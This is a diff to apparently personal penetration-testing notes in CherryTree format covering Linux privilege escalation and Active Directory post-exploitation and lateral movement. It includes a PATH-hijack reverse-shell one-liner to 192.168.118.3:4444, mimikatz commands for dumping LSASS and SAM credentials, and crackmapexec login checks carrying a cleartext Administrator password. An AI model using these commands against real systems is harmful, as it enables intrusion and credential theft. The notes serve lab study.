@@ -444,7 +444,7 @@ Also check this out: </rich_text>
       <rich_text>We have to pay attention to </rich_text>
       <rich_text weight="heavy">files on the machine</rich_text>
       <rich_text>, most of the time, this is how privilege escalation is done.</rich_text>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689886433">
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689886544">
         <rich_text>!Check if we are in a container:
 </rich_text>
         <rich_text justification="left"></rich_text>
@@ -486,7 +486,9 @@ Check files manually:
 Manually check:
 - SUID
 If a strange binary is found as SUID, check it's system calls:
-
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
 
 - SGID
 - Cronjobs (</rich_text>
@@ -505,6 +507,7 @@ If a strange binary is found as SUID, check it's system calls:
 
 Check capabilities:
 </rich_text>
+        <rich_text justification="left"></rich_text>
         <codebox char_offset="33" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hostname
 # If we get gibberish data like "f8e1a236869d", we are in a container and we should escape it =&gt; see services that are on the machine and we could exploit
 # (other services maybe be run by machine itself, not container, and we could gather info about those services from inside the container, to gain RCE
@@ -514,9 +517,9 @@ Check capabilities:
         <codebox char_offset="662" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ltrace {binary} # This will load the executable and print every system call
 # If any systemcall is not with absolute path, we can inject into path:
 export PATH=/tmp:$PATH
-# and add to that path a reverse shell with the name of that binary system call without absolute path
+# and add to that path a reverse shell with the name of that binary system call (called without absolute path)
 echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
-chmod +x lscpu</codebox>
+chmod +x /tmp/{binary}</codebox>
         <codebox char_offset="722" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
         <codebox char_offset="822" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
 # And search for everyone</codebox>
@@ -621,11 +624,85 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
     </node>
     <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1689416622">
       <rich_text>Here it will be AD</rich_text>
-      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1689416627">
-        <rich_text>Here it will be Post Expl</rich_text>
+      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690114547">
+        <rich_text>We will use </rich_text>
+        <rich_text weight="heavy">mimikatz</rich_text>
+        <rich_text>:
+
+Then we will extract using every method, beginning with:
+
+Als check out this: </rich_text>
+        <rich_text link="webs https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49">https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49</rich_text>
+        <rich_text>
+Make sure to extract all.
+
+Rerun </rich_text>
+        <rich_text style="italic">winpeas</rich_text>
+        <rich_text> as admin to extract possible interesting data.
+
+Use </rich_text>
+        <rich_text weight="heavy">SharpHound</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text weight="heavy">BloodHound</rich_text>
+        <rich_text> to detect possible misconfigurations.
+
+Check </rich_text>
+        <rich_text weight="heavy">every file</rich_text>
+        <rich_text>, recheck </rich_text>
+        <rich_text weight="heavy">logs</rich_text>
+        <rich_text>, and </rich_text>
+        <rich_text weight="heavy">every user directory</rich_text>
+        <rich_text>.
+
+Make sure to check every </rich_text>
+        <rich_text weight="heavy">PSReadLine directory</rich_text>
+        <rich_text> for </rich_text>
+        <rich_text weight="heavy">Console history</rich_text>
+        <rich_text>, for </rich_text>
+        <rich_text weight="heavy">every user</rich_text>
+        <rich_text>.
+
+Make sure to check the </rich_text>
+        <rich_text weight="heavy">default password</rich_text>
+        <rich_text>.</rich_text>
+        <codebox char_offset="22" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">privilege::debug # this will allow us to temper with LSASS
+token::elevate # this will make us nt_authority</codebox>
+        <codebox char_offset="81" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sekurlsa::logonpasswords
+lsadump::sam</codebox>
+        <node name="Good To Do" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690114316" ts_lastsave="1690114346">
+          <rich_text>If we have admin we may be able to do more from RDP, so we should enable RDP:
+</rich_text>
+          <rich_text link="webs https://cloudzy.com/blog/enable-rdp-cmd/">https://cloudzy.com/blog/enable-rdp-cmd/</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text link="webs https://github.com/crazywifi/Enable-RDP-One-Liner-CMD">https://github.com/crazywifi/Enable-RDP-One-Liner-CMD</rich_text>
+        </node>
       </node>
-      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1689416635">
-        <rich_text>Here it will be Lat Movement</rich_text>
+      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1690115835">
+        <rich_text>Try credentials using crackmapexec:
+
+Every possible </rich_text>
+        <rich_text weight="heavy">username</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text weight="heavy">password</rich_text>
+        <rich_text> must be stored in a file to check for later use.
+
+If </rich_text>
+        <rich_text weight="heavy">valid credentials</rich_text>
+        <rich_text> are found, we should try </rich_text>
+        <rich_text weight="heavy">evil-winrm</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text weight="heavy">RDP</rich_text>
+        <rich_text> into the machine, even if we don't have local admin with those creds.
+
+Use </rich_text>
+        <rich_text weight="heavy">crackmapexec</rich_text>
+        <rich_text> and </rich_text>
+        <rich_text weight="heavy">smbclient</rich_text>
+        <rich_text> to surf the shares.</rich_text>
+        <codebox char_offset="36" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator # this will check domain users credentials
+proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator --local-auth # this will check local users credentials
+</codebox>
       </node>
     </node>
   </node>
